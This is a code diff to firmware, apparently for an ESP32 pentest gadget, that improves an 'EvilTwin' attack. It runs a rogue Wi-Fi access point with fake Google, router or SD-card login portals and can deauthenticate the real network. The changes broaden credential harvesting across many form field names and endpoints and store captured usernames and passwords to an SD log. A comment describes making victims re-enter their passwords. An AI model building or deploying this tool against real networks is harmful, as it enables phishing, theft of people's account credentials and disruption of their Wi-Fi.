@@ -13,6 +13,7 @@
 #include "input_handling.h"
 #include "clock_manager.h"
 #include "lockscreen_manager.h"
+#include "wifi_sd_guard.h"
 #include <WiFi.h>
 #include <SD.h>
 
@@ -105,16 +106,18 @@ input{width:100%;box-sizing:border-box;padding:10px;margin-bottom:16px;
 
 EvilTwin::EvilTwin(DisplayManager& dm, SDCardManager& sd)
     : dm(dm), sd(sd), server(80),
-      _tmpl(0), _captureCount(0), _dirty(true),
+      _tmpl(0), _captureCount(0), _savedCount(0), _dirty(true),
       _isClone(false), _targetIsOpen(false), _targetChannel(1),
       _deauthEnabled(false), _deauthLastMs(0), _deauthCount(0),
-      _useCustomTemplate(false)
+      _useCustomTemplate(false),
+      _uiNoticeMs(0), _uiNoticeColor(TFT_GREEN)
 {
     _ssid[0]            = '\0';
     _lastUser[0]        = '\0';
     _lastPass[0]        = '\0';
     _sdTemplatePath[0]  = '\0';
     _sdTemplateName[0]  = '\0';
+    _uiNoticeText[0]    = '\0';
     memset(_targetBSSID, 0, 6);
     memset(_fakeMAC,     0, 6);
 }
@@ -123,6 +126,7 @@ EvilTwin::EvilTwin(DisplayManager& dm, SDCardManager& sd)
 
 void EvilTwin::start(const char* ssid) {
     _captureCount       = 0;
+    _savedCount         = 0;
     _lastUser[0]        = '\0';
     _lastPass[0]        = '\0';
     memset(_creds, 0, sizeof(_creds));
@@ -137,6 +141,8 @@ void EvilTwin::start(const char* ssid) {
     _useCustomTemplate  = false;
     _sdTemplatePath[0]  = '\0';
     _sdTemplateName[0]  = '\0';
+    _uiNoticeMs         = 0;
+    _uiNoticeText[0]    = '\0';
     memset(_targetBSSID, 0, 6);
     memset(_fakeMAC,     0, 6);
 
@@ -221,23 +227,33 @@ void EvilTwin::start(const char* ssid) {
 
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') break;
-        if (k == 't' || k == 'T') {
-            _useCustomTemplate = false;
-            _tmpl = (_tmpl + 1) % 2;
-            _dirty = true;
-        }
         if (k == 'p' || k == 'P') {
             server.stop(); dns.stop();
-            if (pickSdTemplate()) _dirty = true;
+            pickTemplate();
             setupRoutes(); server.begin();
+            dns.start(53, "*", AP_IP);
+            _dirty = true;   // always repaint status screen after the picker
         }
         if (k == 'c' || k == 'C') {
             showCredsTable();
             drawScreen(); lastDraw = millis(); _dirty = false;
         }
         if (k == 's' || k == 'S') {
-            saveCredsToSD();
-            drawScreen(); lastDraw = millis(); _dirty = false;
+            // Creds live in RAM during capture (GDMA-safe); [s] checkpoints to SD.
+            if (!sd.isReady()) {
+                _uiNoticeColor = TFT_RED;
+                strcpy(_uiNoticeText, "SD not ready");
+            } else if (_captureCount == 0) {
+                _uiNoticeColor = TFT_YELLOW;
+                strcpy(_uiNoticeText, "No creds to save");
+            } else {
+                int n = flushCredsToSD(false);   // false → pause promiscuous around write
+                _uiNoticeColor = TFT_GREEN;
+                if (n > 0) snprintf(_uiNoticeText, sizeof(_uiNoticeText), "Saved %d new to SD", n);
+                else       strcpy(_uiNoticeText, "Already saved");
+            }
+            _uiNoticeMs = millis();
+            _dirty = true;
         }
     }
 
@@ -250,6 +266,10 @@ void EvilTwin::start(const char* ssid) {
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
     delay(100);
+
+    // SD is now fully GDMA-safe (AP down, promiscuous off, WiFi idle) — persist
+    // any creds captured but not yet flushed via [s].
+    flushCredsToSD(true);
 
     dm.printCommandScreen();
 }
@@ -480,8 +500,15 @@ bool EvilTwin::askDeauth() {
 // ── Portal routes ─────────────────────────────────────────────────────────────
 
 void EvilTwin::setupRoutes() {
-    server.on("/",     HTTP_GET,  [this]() { handleRoot(); });
-    server.on("/post", HTTP_POST, [this]() { handlePost(); });
+    server.on("/", HTTP_GET, [this]() { handleRoot(); });
+
+    // Credential submission endpoints. Portals vary wildly:
+    //  - built-in templates POST to /post  (fields user/pass)
+    //  - Bruce-style SD portals GET/POST to /get  (fields email/password, uname/psw…)
+    // Register BOTH paths for BOTH verbs and let captureArgs() figure out the
+    // field names, so any of the /apps/eviltwin/portal/*.html pages capture.
+    server.on("/post", HTTP_ANY, [this]() { handleCapture(); });
+    server.on("/get",  HTTP_ANY, [this]() { handleCapture(); });
 
     auto redir = [this]() { handleRedirect(); };
 
@@ -506,8 +533,10 @@ void EvilTwin::setupRoutes() {
     server.on("/success.txt",                           HTTP_GET, redir);
     server.on("/detected.html",                         HTTP_GET, redir);
 
-    // catch-all
-    server.onNotFound([this]() { handleRedirect(); });
+    // catch-all: some portals submit to an unexpected path — try to capture
+    // creds from the args first, then redirect. (OS probe hits carry no form
+    // args, so captureArgs() is a harmless no-op for them.)
+    server.onNotFound([this]() { handleCapture(); });
 }
 
 void EvilTwin::handleRoot() {
@@ -522,44 +551,90 @@ void EvilTwin::handleRoot() {
             server.send(200, "text/html", html);
             return;
         }
-        _useCustomTemplate = false; // file gone — fall through to built-in
+        // file gone — fall through to built-in
+        _useCustomTemplate = false;
+        _uiNoticeMs    = millis();
+        _uiNoticeColor = TFT_RED;
+        snprintf(_uiNoticeText, sizeof(_uiNoticeText), "Portal file missing — fell back");
+        _dirty = true;
     }
     server.send(200, "text/html", _tmpl == 0 ? HTML_GOOGLE : HTML_ROUTER);
 }
 
-void EvilTwin::handlePost() {
-    String user = server.arg("user");
-    String pass = server.arg("pass");
+// ── Field-name classification ─────────────────────────────────────────────────
+// Portals don't agree on input names. Classify by substring (case-insensitive)
+// so we capture whatever the page happens to call its username/password fields.
+static inline bool etNameHas(const String& ln, const char* kw) { return ln.indexOf(kw) >= 0; }
 
-    if (user.length() > 0 || pass.length() > 0) {
-        strncpy(_lastUser, user.c_str(), 47); _lastUser[47] = '\0';
-        strncpy(_lastPass, pass.c_str(), 47); _lastPass[47] = '\0';
-        if (_captureCount < ET_MAX_CREDS) {
-            strncpy(_creds[_captureCount].user, user.c_str(), 47);
-            _creds[_captureCount].user[47] = '\0';
-            strncpy(_creds[_captureCount].pass, pass.c_str(), 47);
-            _creds[_captureCount].pass[47] = '\0';
-        }
-        if (sd.isReady()) {
-            sd.ensureDir(ET_DIR_PATH);
-            char ts[22] = "";
-            ClockManager::instance().getTimestamp(ts, sizeof(ts));
-            String logRow = ts[0] ? (String(ts) + "," + user + "," + pass)
-                                  : (user + "," + pass);
-            sd.appendLine(ET_LOG_PATH, logRow);
-        }
-        _captureCount++;
-        _dirty = true;
+static bool etIsPassField(const String& ln) {
+    return etNameHas(ln, "pass") || etNameHas(ln, "pwd") || etNameHas(ln, "psw") ||
+           etNameHas(ln, "passcode") || ln == "pin";
+}
+static bool etIsUserField(const String& ln) {
+    return etNameHas(ln, "email") || etNameHas(ln, "user") || etNameHas(ln, "login") ||
+           etNameHas(ln, "uname") || etNameHas(ln, "account") || etNameHas(ln, "phone") ||
+           etNameHas(ln, "mobile") || etNameHas(ln, "identifier") || etNameHas(ln, "ident") ||
+           ln == "id" || ln == "name" || ln == "tel";
+}
+// Non-credential fields that must never be mistaken for a username in the fallback.
+static bool etIsIgnoreField(const String& ln) {
+    return etNameHas(ln, "remember") || etNameHas(ln, "token") || etNameHas(ln, "csrf") ||
+           etNameHas(ln, "captcha")  || etNameHas(ln, "submit") || etNameHas(ln, "button") ||
+           etNameHas(ln, "viewport") || etNameHas(ln, "layer")  || etNameHas(ln, "hidden");
+}
+
+bool EvilTwin::captureArgs() {
+    String user, pass;
+    int n = server.args();
+    for (int i = 0; i < n; i++) {
+        String nm = server.argName(i);
+        if (nm == "plain") continue;          // raw POST body, not a named field
+        String val = server.arg(i);
+        if (val.length() == 0) continue;
+        String ln = nm; ln.toLowerCase();
+        if      (pass.length() == 0 && etIsPassField(ln)) pass = val;
+        else if (user.length() == 0 && etIsUserField(ln)) user = val;
     }
 
-    server.sendHeader("Location", "http://192.168.4.1/");
-    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
-    server.send(302, "text/html",
-        "<html><head>"
-        "<meta http-equiv='refresh' content='0;url=http://192.168.4.1/'>"
-        "</head><body>"
-        "<a href='http://192.168.4.1/'>Continue</a>"
-        "</body></html>");
+    // Fallback: recognized a password but the username field had an odd name —
+    // take the first non-empty field that isn't the password or junk.
+    if (pass.length() > 0 && user.length() == 0) {
+        for (int i = 0; i < n; i++) {
+            String nm = server.argName(i);
+            if (nm == "plain") continue;
+            String val = server.arg(i);
+            if (val.length() == 0) continue;
+            String ln = nm; ln.toLowerCase();
+            if (etIsPassField(ln) || etIsIgnoreField(ln)) continue;
+            user = val; break;
+        }
+    }
+
+    if (user.length() == 0 && pass.length() == 0) return false;   // nothing useful
+
+    strncpy(_lastUser, user.c_str(), 47); _lastUser[47] = '\0';
+    strncpy(_lastPass, pass.c_str(), 47); _lastPass[47] = '\0';
+    // RAM-only capture — NO SD write here. Writing to SD while the soft-AP /
+    // promiscuous (deauth) DMA is live risks FatFS corruption (GDMA rule), and
+    // the victim submitting the form is the worst moment to lose data. Creds are
+    // flushed to SD on [s] (promiscuous paused) and on exit.
+    if (_captureCount < ET_MAX_CREDS) {
+        CapturedCred& c = _creds[_captureCount];
+        strncpy(c.user, user.c_str(), 47); c.user[47] = '\0';
+        strncpy(c.pass, pass.c_str(), 47); c.pass[47] = '\0';
+        c.ts[0] = '\0';
+        ClockManager::instance().getTimestamp(c.ts, sizeof(c.ts));
+    }
+    _captureCount++;
+    _dirty = true;
+    return true;
+}
+
+void EvilTwin::handleCapture() {
+    captureArgs();
+    // Always bounce back to the portal root — a reload looks like a failed login,
+    // so the victim re-enters (and we capture again). Reuses the proven redirect.
+    handleRedirect();
 }
 
 void EvilTwin::handleRedirect() {
@@ -631,6 +706,7 @@ void EvilTwin::drawScreen() {
     dm.println(buf);
 
     dm.setCursor(4, dm.getCursorY());
+    dm.setTextColor(0x7BEF);
     if (_useCustomTemplate) {
         snprintf(buf, sizeof(buf), "Chan : %d   Page: %.20s", _targetChannel, _sdTemplateName);
     } else {
@@ -638,6 +714,13 @@ void EvilTwin::drawScreen() {
                  _targetChannel, _tmpl == 0 ? "Google" : "Router");
     }
     dm.println(buf);
+
+    // transient confirmation when the active portal page changes (or falls back)
+    if (_uiNoticeMs && millis() - _uiNoticeMs < 1500) {
+        dm.setCursor(4, dm.getCursorY());
+        dm.setTextColor(_uiNoticeColor);
+        dm.println(_uiNoticeText);
+    }
 
     dm.setCursor(4, dm.getCursorY());
     dm.setTextColor(TFT_YELLOW);
@@ -677,7 +760,7 @@ void EvilTwin::drawScreen() {
 
     dm.setCursor(4, dm.getCursorY());
     dm.setTextColor(0x7BEF);
-    dm.println("[q]quit [t]tmpl [p]portal [c]creds [s]save");
+    dm.println("[q]quit [p]portal [c]creds [s]save");
 }
 
 // ── Credentials table ─────────────────────────────────────────────────────────
@@ -732,9 +815,10 @@ void EvilTwin::showCredsTable() {
 
             if (_captureCount > ET_MAX_CREDS) {
                 dm.setCursor(4, dm.getCursorY());
-                dm.setTextColor(TFT_YELLOW);
-                char warn[40];
-                snprintf(warn, sizeof(warn), "+%d more — see SD log", _captureCount - ET_MAX_CREDS);
+                dm.setTextColor(TFT_RED);
+                char warn[44];
+                snprintf(warn, sizeof(warn), "+%d dropped (buffer full, max %d)",
+                         _captureCount - ET_MAX_CREDS, ET_MAX_CREDS);
                 dm.println(warn);
             }
 
@@ -744,131 +828,151 @@ void EvilTwin::showCredsTable() {
             redraw = false;
         }
 
+        // Keep the captive portal responsive while the operator views creds.
+        dns.processNextRequest();
+        server.handleClient();
+
         char k = inputHandler.getKeyboardInput();
-        if (!k) continue;
+        if (!k) { delay(2); continue; }
         if (k == 'q' || k == 'Q') break;
         if ((k == 'l' || k == 'L') && page < pages - 1) { page++; redraw = true; }
         if ((k == 'a' || k == 'A') && page > 0)         { page--; redraw = true; }
     }
 }
 
-void EvilTwin::saveCredsToSD() {
-    dm.clearScreen();
-    dm.setDefaultTextSize();
-    dm.setCursor(4, outputY);
+int EvilTwin::flushCredsToSD(bool /*wifiSafe*/) {
+    if (!sd.isReady() || _captureCount == 0) return 0;
 
-    if (_captureCount == 0) {
-        dm.setTextColor(TFT_YELLOW);
-        dm.println("No credentials to save.");
-        delay(1500);
-        return;
-    }
+    int total = min(_captureCount, ET_MAX_CREDS);
+    if (_savedCount >= total) return 0;   // nothing new since last flush
 
-    if (!sd.isReady()) {
-        dm.setTextColor(TFT_RED);
-        dm.println("SD card not ready.");
-        delay(1500);
-        return;
-    }
+    // GDMA: pause promiscuous (if live) around the SD write, restore after.
+    // Self-correcting — on the exit path promiscuous is already off, so this is
+    // a no-op. (The old wifiSafe arg is now redundant; kept for call sites.)
+    ScopedPromiscPause _gdma;
 
     sd.ensureDir(ET_DIR_PATH);
-
-    // Remove existing log and rewrite all in-memory creds cleanly
-    if (SD.exists(ET_LOG_PATH)) SD.remove(ET_LOG_PATH);
-
-    int saved = min(_captureCount, ET_MAX_CREDS);
-    for (int i = 0; i < saved; i++) {
-        sd.appendLine(ET_LOG_PATH, String(_creds[i].user) + "," + String(_creds[i].pass));
+    int written = 0;
+    for (int i = _savedCount; i < total; i++) {
+        String row = _creds[i].ts[0]
+            ? (String(_creds[i].ts) + "," + _creds[i].user + "," + _creds[i].pass)
+            : (String(_creds[i].user) + "," + _creds[i].pass);
+        sd.appendLine(ET_LOG_PATH, row);
+        written++;
     }
+    _savedCount = total;
 
-    dm.setTextColor(TFT_GREEN);
-    char buf[48];
-    snprintf(buf, sizeof(buf), "Saved %d cred(s) to SD.", saved);
-    dm.println(buf);
-    dm.setCursor(4, dm.getCursorY());
-    dm.setTextColor(0x7BEF);
-    dm.println(ET_LOG_PATH);
-    delay(2000);
+    return written;
 }
 
-// ── SD template picker ────────────────────────────────────────────────────────
+// ── Portal template picker (built-in + SD) ───────────────────────────────────
 
-bool EvilTwin::pickSdTemplate() {
-    auto showErr = [&](const char* line1, const char* line2 = nullptr) {
-        dm.clearScreen();
-        dm.setDefaultTextSize();
-        dm.setCursor(4, outputY);
-        dm.setTextColor(TFT_RED);
-        dm.println(line1);
-        if (line2) {
-            dm.setCursor(4, dm.getCursorY());
-            dm.setTextColor(0x7BEF);
-            dm.println(line2);
-        }
-        delay(2500);
-    };
-
-    if (!sd.isReady()) { showErr("SD card not ready."); return false; }
-
-    File dir = SD.open(ET_PORTAL_DIR);
-    if (!dir || !dir.isDirectory()) {
-        showErr("No /apps/eviltwin/portal/ folder on SD.", "Create it and add .html files.");
-        return false;
-    }
-
-    // Collect up to 8 .html / .htm filenames
-    char names[ET_PER_PAGE][48] = {};
-    int  count = 0;
-    while (count < ET_PER_PAGE) {
-        File f = dir.openNextFile();
-        if (!f) break;
-        if (!f.isDirectory()) {
-            String nm = String(f.name());
-            String nml = nm; nml.toLowerCase();
-            if (nml.endsWith(".html") || nml.endsWith(".htm")) {
-                strncpy(names[count], nm.c_str(), 47);
-                names[count][47] = '\0';
-                count++;
+bool EvilTwin::pickTemplate() {
+    // Collect all .html / .htm filenames from SD (if available)
+    char names[ET_TEMPLATE_MAX][48] = {};
+    int  sdCount = 0;
+    if (sd.isReady()) {
+        File dir = SD.open(ET_PORTAL_DIR);
+        if (dir && dir.isDirectory()) {
+            while (sdCount < ET_TEMPLATE_MAX) {
+                File f = dir.openNextFile();
+                if (!f) break;
+                if (!f.isDirectory()) {
+                    String nm = String(f.name());
+                    String nml = nm; nml.toLowerCase();
+                    if (nml.endsWith(".html") || nml.endsWith(".htm")) {
+                        strncpy(names[sdCount], nm.c_str(), 47);
+                        names[sdCount][47] = '\0';
+                        sdCount++;
+                    }
+                }
+                f.close();
             }
         }
-        f.close();
-    }
-    dir.close();
-
-    if (count == 0) {
-        showErr("No .html files in /apps/eviltwin/portal/");
-        return false;
+        if (dir) dir.close();
     }
 
-    // Show picker
-    dm.clearScreen();
-    dm.setDefaultTextSize();
-    dm.setCursor(4, outputY);
-    dm.setTextColor(TFT_CYAN);
-    dm.println("SD Templates — pick file:");
-
-    for (int i = 0; i < count; i++) {
-        dm.setCursor(4, dm.getCursorY());
-        dm.setTextColor(TFT_WHITE);
-        char buf[52];
-        snprintf(buf, sizeof(buf), "[%d] %s", i + 1, names[i]);
-        dm.println(buf);
-    }
-    dm.setCursor(4, dm.getCursorY());
-    dm.setTextColor(0x7BEF);
-    dm.println("[q] cancel");
+    // index 0/1 = built-in templates, 2.. = SD templates
+    int  total  = 2 + sdCount;
+    int  page   = 0;
+    int  pages  = (total + ET_PER_PAGE - 1) / ET_PER_PAGE;
+    bool redraw = true;
 
     while (true) {
+        if (redraw) {
+            dm.clearScreen();
+            dm.setDefaultTextSize();
+            dm.setCursor(4, outputY);
+            dm.setTextColor(TFT_CYAN);
+            dm.println("Pick portal page:");
+
+            int start = page * ET_PER_PAGE;
+            int end   = min(start + ET_PER_PAGE, total);
+            for (int i = start; i < end; i++) {
+                char label[40];
+                bool isCurrent;
+                if (i == 0) {
+                    strcpy(label, "Google (built-in)");
+                    isCurrent = !_useCustomTemplate && _tmpl == 0;
+                } else if (i == 1) {
+                    strcpy(label, "Router (built-in)");
+                    isCurrent = !_useCustomTemplate && _tmpl == 1;
+                } else {
+                    snprintf(label, sizeof(label), "%.36s", names[i - 2]);
+                    isCurrent = _useCustomTemplate &&
+                                strcmp(_sdTemplateName, names[i - 2]) == 0;
+                }
+                dm.setCursor(4, dm.getCursorY());
+                dm.setTextColor(isCurrent ? TFT_GREEN : TFT_WHITE);
+                char buf[52];
+                snprintf(buf, sizeof(buf), "%s[%d] %s",
+                         isCurrent ? "> " : "  ", i - start + 1, label);
+                dm.println(buf);
+            }
+
+            if (sdCount == 0) {
+                dm.setCursor(4, dm.getCursorY());
+                dm.setTextColor(TFT_DARKGREY);
+                dm.println("(no SD templates found)");
+            }
+
+            dm.setCursor(4, dm.getCursorY());
+            dm.setTextColor(0x7BEF);
+            char nav[48];
+            snprintf(nav, sizeof(nav), "[n]ext [p]rev [q]uit  pg %d/%d", page + 1, pages);
+            dm.println(nav);
+            redraw = false;
+        }
+
         char k = inputHandler.getKeyboardInput();
         if (!k) { delay(20); continue; }
         if (k == 'q' || k == 'Q') return false;
-        if (k >= '1' && k <= '0' + min(count, ET_PER_PAGE)) {
-            int idx = k - '1';
-            snprintf(_sdTemplatePath, sizeof(_sdTemplatePath),
-                     ET_PORTAL_DIR "/%s", names[idx]);
-            strncpy(_sdTemplateName, names[idx], 31);
-            _sdTemplateName[31] = '\0';
-            _useCustomTemplate  = true;
+        if ((k == 'n' || k == 'N') && page < pages - 1) { page++; redraw = true; continue; }
+        if ((k == 'p' || k == 'P') && page > 0)         { page--; redraw = true; continue; }
+
+        if (k >= '1' && k <= '0' + ET_PER_PAGE) {
+            int idx = page * ET_PER_PAGE + (k - '1');
+            if (idx >= total) continue;
+
+            if (idx == 0) {
+                _useCustomTemplate = false;
+                _tmpl = 0;
+                strcpy(_uiNoticeText, "Portal: Google (built-in)");
+            } else if (idx == 1) {
+                _useCustomTemplate = false;
+                _tmpl = 1;
+                strcpy(_uiNoticeText, "Portal: Router (built-in)");
+            } else {
+                int sdIdx = idx - 2;
+                snprintf(_sdTemplatePath, sizeof(_sdTemplatePath),
+                         ET_PORTAL_DIR "/%s", names[sdIdx]);
+                strncpy(_sdTemplateName, names[sdIdx], 31);
+                _sdTemplateName[31] = '\0';
+                _useCustomTemplate  = true;
+                snprintf(_uiNoticeText, sizeof(_uiNoticeText), "Portal: %.30s", _sdTemplateName);
+            }
+            _uiNoticeMs    = millis();
+            _uiNoticeColor = TFT_GREEN;
             return true;
         }
     }
